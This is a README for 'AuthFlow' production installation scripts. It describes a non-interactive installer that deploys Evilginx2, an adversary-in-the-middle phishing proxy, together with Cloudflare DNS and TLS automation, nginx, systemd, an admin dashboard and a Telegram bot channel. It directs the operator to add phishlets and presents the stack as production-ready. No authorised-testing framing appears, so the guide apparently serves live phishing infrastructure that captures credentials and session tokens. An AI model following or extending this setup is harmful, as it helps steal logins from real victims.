# AuthFlow Production Installation Guide

## 📋 Overview

This directory contains production-ready installation and operations scripts for AuthFlow. The new setup process is:
- **Non-interactive** (no prompts during install)
- **Deterministic** (pinned package versions)
- **Complete** (includes nginx, TLS, systemd, monitoring)
- **Evilginx2-ready** (full integration support)
- **SQLite-only** (no MongoDB or external DBs)
- **Cloudflare-native** (automatic DNS + TLS renewal)

---

## 🚀 Quick Start

### 1. Prepare Credentials
Gather these values before starting:
```
Domain: example.com
VPS IP: 203.0.113.42
Cloudflare Token: cfut_xxxxx (from dash.cloudflare.com)
Telegram Bot Token: 123456:ABCDEFgh (from @BotFather)
Telegram Chat ID: 9876543210 (from api.telegram.org)
Admin Password: YourSecurePassword (or auto-generate)
```

### 2. Copy Environment Template
```bash
cp scripts/.env.template scripts/.env.production
nano scripts/.env.production  # Fill in your values
```

### 3. Run Installation
```bash
source scripts/.env.production
sudo -E ./scripts/install-prod.sh
```

That's it! The script handles:
- ✅ Dependency installation (with version pinning)
- ✅ Cloudflare credentials setup
- ✅ Evilginx2 deployment
- ✅ AuthFlow build & deployment
- ✅ TLS provisioning via Cloudflare DNS
- ✅ nginx configuration
- ✅ systemd service setup
- ✅ Automatic startup

---

## 📁 File Structure

```
scripts/
├── install-prod.sh          # Main production installer (844 lines)
├── operations.sh             # Interactive operations menu
├── DEPLOYMENT.md             # Detailed deployment guide
├── .env.template             # Environment variables template
├── README.md                 # This file
└── [old install.sh]         # Legacy (deprecated)
```

---

## 📖 Files Explained

### `install-prod.sh` (Production Installer)
**What it does:**
- Validates prerequisites (root, repo, commands)
- Installs packages with pinned versions
- Sets up Cloudflare credentials file
- Clones/builds Evilginx2
- Deploys AuthFlow from repository
- Builds Go binary with optimizations
- Generates configuration
- Provisions TLS certs via Cloudflare DNS
- Configures nginx with security headers
- Creates systemd service
- Auto-starts service

**How to use:**
```bash
# Option 1: Environment variables
sudo DOMAIN=example.com VPS_IP=x.x.x.x \
     CLOUDFLARE_TOKEN=cfut_xxx \
     TELEGRAM_TOKEN=xxx TELEGRAM_CHAT=xxx \
     ADMIN_PASS=secret \
     ./scripts/install-prod.sh

# Option 2: CLI flags
sudo ./scripts/install-prod.sh \
  --domain example.com \
  --vps-ip x.x.x.x \
  --cloudflare-token cfut_xxx \
  --telegram-token xxx \
  --telegram-chat xxx \
  --admin-pass secret

# Option 3: .env file
source scripts/.env.production
sudo -E ./scripts/install-prod.sh
```

**Key features:**
- Non-interactive (perfect for CI/CD, automation)
- Deterministic (same versions every time)
- Error handling (exits on any failure)
- Validation (checks all prerequisites)
- Logging (clear progress messages)
- Security (secure file permissions, no hardcoded secrets)

---

### `operations.sh` (Interactive Operations Menu)
**What it does:**
Provides interactive menu for common tasks after installation.

**How to use:**
```bash
sudo ./scripts/operations.sh
```

**Available options:**
```
1. Service Status       - Show current status
2. Restart Service      - Restart AuthFlow
3. Stop Service         - Stop AuthFlow
4. Start Service        - Start AuthFlow
5. View Logs (live)     - Follow logs in real-time
6. View Logs (recent)   - Last 50 log entries
7. Health Check         - Full system check
8. Certificate Status   - TLS certificate details
9. nginx Status         - Check nginx
10. Disk Usage          - Check disk space
11. System Resources    - CPU/Memory usage
12. View Config         - Display config.json
13. Dashboard URL       - Show dashboard URL
14. Edit Config         - Edit configuration
15. Renew Certificate   - Force cert renewal
16. Reload nginx        - Reload web server
17. Update App          - Pull & rebuild
18. Create Backup       - Backup all data
19. Firewall Status     - Check UFW rules
20. Port Status         - Check open ports
21. View Errors         - Recent error logs
```

---

### `.env.template` (Environment Template)
**What it is:**
Template for setting up environment variables for non-interactive installation.

**How to use:**
```bash
# Copy template
cp scripts/.env.template scripts/.env.production

# Edit with your values
nano scripts/.env.production

# Source before running installer
source scripts/.env.production
sudo -E ./scripts/install-prod.sh
```

**Variables:**
- `DOMAIN` - Primary domain (required)
- `VPS_IP` - Public IPv4 address (required)
- `CLOUDFLARE_TOKEN` - Cloudflare API token (required)
- `TELEGRAM_TOKEN` - Telegram bot token (required)
- `TELEGRAM_CHAT` - Telegram chat ID (required)
- `ADMIN_PASS` - Admin password (optional, auto-generated)
- `REPO_SOURCE` - Repository path (optional, defaults to current dir)
- `APP_PORT` - Application port (optional, defaults to 8080)

---

### `DEPLOYMENT.md` (Detailed Guide)
**What it contains:**
- Step-by-step deployment instructions
- Prerequisites and credential setup
- Installation verification
- Configuration & testing
- Operations and maintenance
- Security best practices
- Troubleshooting guide
- Backup/restore procedures

**When to read it:**
- Before first deployment
- For detailed explanations
- When troubleshooting issues
- For security hardening

---

## ✨ Key Improvements Over Legacy Script

| Feature | Old | New |
|---------|-----|-----|
| Interactive | ✓ (prompts) | ✗ (non-interactive) |
| Package Versions | ✗ (latest) | ✓ (pinned) |
| Repository Deploy | ✗ (missing) | ✓ (full copy) |
| Cloudflare Token | ✗ (unused) | ✓ (proper setup) |
| TLS Provisioning | ✗ (none) | ✓ (automatic) |
| nginx Config | ✗ (none) | ✓ (hardened) |
| systemd Service | ✗ (none) | ✓ (auto-restart) |
| Evilginx Integration | ✗ (partial) | ✓ (complete) |
| Error Handling | ✗ (continues) | ✓ (exits on error) |
| Security Headers | ✗ (none) | ✓ (HSTS, CSP, etc) |
| Rate Limiting | ✗ (none) | ✓ (nginx limits) |
| Logging | ✗ (basic) | ✓ (comprehensive) |
| Documentation | ✗ (none) | ✓ (extensive) |

---

## 🔒 Security Features

The production installer includes:
- **SSL/TLS**: Automatic provisioning via Cloudflare DNS
- **Rate Limiting**: nginx rate limits on API endpoints
- **Security Headers**: HSTS, X-Frame-Options, CSP, etc.
- **Credential Files**: Restricted permissions (600)
- **Firewall Ready**: Integrates with UFW
- **Service User**: Runs as unprivileged user
- **Process Isolation**: systemd ProtectSystem/ProtectHome
- **Logging**: Comprehensive audit trail
- **Backup**: Built-in backup functionality

---

## 📊 Installation Flow

```
┌─────────────────────────────────────┐
│ Validate Config & Prerequisites      │
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│ Install Dependencies (pinned)       │
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│ Setup Cloudflare Credentials        │
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│ Install Evilginx2                    │
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│ Deploy AuthFlow Source               │
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│ Build Go Binary                      │
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│ Create Configuration                 │
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│ Provision TLS Certs (Cloudflare)     │
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│ Configure nginx Reverse Proxy        │
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│ Create systemd Service               │
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│ Start Service & Verify               │
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│ Print Summary & Access Info          │
└─────────────────────────────────────┘
```

---

## 🚨 Troubleshooting

### "go: not found"
```bash
sudo apt-get install -y golang-go
```

### "certbot: command not found"
```bash
sudo apt-get install -y certbot python3-certbot-dns-cloudflare
```

### Service won't start
```bash
# Check logs
sudo journalctl -u authflow -n 100

# Verify config
sudo jq . /opt/authflow/config.json

# Check permissions
sudo ls -la /opt/authflow/
```

### Certificate renewal fails
```bash
# Test renewal
sudo certbot renew --dry-run

# Check Cloudflare credentials
sudo cat /etc/letsencrypt/cloudflare-token.ini
```

### nginx shows errors
```bash
# Test config
sudo nginx -t

# Check logs
sudo tail -f /var/log/nginx/authflow_error.log
```

For more troubleshooting, see [DEPLOYMENT.md](DEPLOYMENT.md).

---

## 📞 Support

- **GitHub Issues**: https://github.com/tartmo/authflow/issues
- **Documentation**: See [DEPLOYMENT.md](DEPLOYMENT.md)
- **Logs**: `sudo journalctl -u authflow -f`
- **Operations Menu**: `sudo ./scripts/operations.sh`

---

## ✅ Verification Checklist

After installation, verify:
- [ ] Service running: `sudo systemctl status authflow`
- [ ] Web access: `https://example.com/ADMIN_PATH`
- [ ] TLS working: Certificate shows valid
- [ ] Database: `/opt/authflow/data/` exists
- [ ] Logs: `sudo journalctl -u authflow -n 20`
- [ ] nginx: `sudo systemctl status nginx`
- [ ] Evilginx: `/usr/local/bin/evilginx` exists
- [ ] Backups: Created at `/root/authflow-backup-*.tar.gz`

---

## 📝 Version Info

- **AuthFlow**: Latest from git
- **Evilginx2**: Latest stable
- **Go**: 1.22+
- **nginx**: 1.24.0+
- **Ubuntu**: 22.04 LTS / 24.04 LTS

---

## 🎯 Next Steps

1. **Initial Setup**: Follow [DEPLOYMENT.md](DEPLOYMENT.md)
2. **Configuration**: Access dashboard at `https://DOMAIN/ADMIN_PATH`
3. **Evilginx Setup**: Add phishlets in `/opt/evilginx2/phishlets/`
4. **Monitoring**: Use `sudo ./scripts/operations.sh` for daily ops
5. **Backups**: Schedule regular backups (see operations menu)
6. **Security**: Review [DEPLOYMENT.md](DEPLOYMENT.md) security section

---

**Last Updated**: May 15, 2026  
**Maintained By**: Tartmo Security Team  
**Status**: Production Ready ✅
